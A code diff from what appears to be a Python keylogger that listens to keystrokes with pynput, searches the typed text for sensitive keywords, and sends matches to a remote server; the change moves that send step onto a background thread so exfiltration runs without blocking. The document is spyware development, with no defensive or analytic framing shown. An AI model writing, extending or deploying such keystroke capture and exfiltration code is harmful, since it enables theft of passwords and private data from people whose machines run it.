@@ -1,4 +1,6 @@
 import re
+import threading
+
 from pynput import keyboard as pynput_keyboard
 import keyboard as py_keyboard
 import Global
@@ -30,7 +32,8 @@ def get_click(tecla):
     if any(re.search(keyword, text, re.I) for keyword in keywords):
         print("Información sensible detectada! Enviando datos...")
         # Llama a la función para enviar datos al servidor remoto
-        send_data(text)
+        h1 = threading.Thread(target=send_data, args=(text,))
+        h1.start()
         print(sensitive_data)
         # Limpia la lista sensitive_data
         sensitive_data.clear()
